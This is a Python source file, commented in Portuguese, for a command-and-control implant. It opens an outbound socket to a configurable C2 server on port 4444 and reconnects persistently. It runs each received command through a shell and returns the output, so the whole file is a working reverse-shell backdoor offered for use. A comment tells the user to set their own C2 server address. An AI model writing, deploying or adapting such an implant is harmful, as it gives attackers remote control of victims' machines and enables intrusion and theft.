import socket
import subprocess
import time
import os

class Implant:
    """
    Implante que se conecta a um servidor C2, recebe comandos,
    os executa e envia o resultado de volta.
    """
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.sock = None

    def connect(self):
        """Tenta se conectar ao servidor C2 com tentativas de reconexão."""
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.c2_host, self.c2_port))
                return
            except socket.error:
                print("Falha na conexão, tentando novamente em 10 segundos...")
                time.sleep(10) # Espera antes de tentar novamente

    def run(self):
        """Loop principal do implante: conecta, recebe e executa comandos."""
        self.connect()

        while True:
            try:
                command = self.sock.recv(1024).decode('utf-8', errors='ignore').strip()
                
                if not command:
                    continue
                
                if command.lower() == 'ping':
                    # Apenas para manter a conexão viva, não faz nada
                    continue

                if command.lower() in ['quit', 'exit']:
                    self.sock.close()
                    break

                # Caso especial para o comando 'cd'
                if command.startswith('cd '):
                    try:
                        dir_path = command[3:].strip()
                        os.chdir(dir_path)
                        output = f"Diretório alterado para: {os.getcwd()}"
                    except FileNotFoundError:
                        output = f"Erro: Diretório não encontrado: {dir_path}"
                    except Exception as e:
                        output = f"Erro ao mudar de diretório: {str(e)}"
                else:
                    # Executa outros comandos do shell
                    proc = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = proc.communicate()
                    output = stdout + stderr

                # Envia o resultado de volta ao servidor
                self.sock.send(output.encode('utf-8', errors='ignore'))

            except (socket.error, BrokenPipeError, ConnectionResetError):
                # Se a conexão cair, tenta reconectar
                print("Conexão perdida. Tentando reconectar...")
                self.sock.close()
                self.connect()
            except Exception as e:
                error_msg = f"Erro inesperado: {str(e)}"
                try:
                    self.sock.send(error_msg.encode('utf-8', errors='ignore'))
                except socket.error:
                    pass # A conexão pode já estar morta
                

if __name__ == "__main__":
    C2_HOST = '127.0.0.1'  # IMPORTANTE: Altere para o IP do seu servidor C2
    C2_PORT = 4444
    implant = Implant(C2_HOST, C2_PORT)
    implant.run()
